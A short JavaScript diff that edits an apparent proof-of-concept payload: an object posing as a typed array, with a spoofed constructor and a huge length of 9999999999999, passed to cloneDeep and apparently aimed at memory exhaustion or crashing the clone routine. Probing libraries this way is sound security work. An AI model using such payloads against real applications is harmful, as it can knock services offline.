@@ -4,7 +4,8 @@ const payload = {
     "length": 100,
     "buffer": Buffer.from("WOOO"),
     "byteOffset": 0,
-    "constructor":{"name":"Int8Array"}
+    "constructor": constructor({length: 9999999999999})
 }
 
 let copy = cloneDeep(payload);
+console.log(payload.constructor)
